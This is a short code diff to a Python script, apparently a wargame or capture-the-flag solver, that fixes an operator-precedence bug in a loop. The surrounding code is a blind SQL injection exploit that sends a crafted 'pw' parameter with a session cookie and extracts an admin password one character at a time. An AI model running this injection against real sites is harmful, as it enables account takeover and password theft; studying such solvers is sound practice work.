@@ -22,7 +22,7 @@ password = ""
 
 for i in range(plen):
     for j in range(256):
-        j = j + 32 % 256
+        j = (j + 32) % 256
         param = {"pw": "a' || id='admin' && ascii(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -"}
         response = requests.get(url, params=param, cookies=cookie)
         if "<h2>Hello admin</h2>" in response.text:
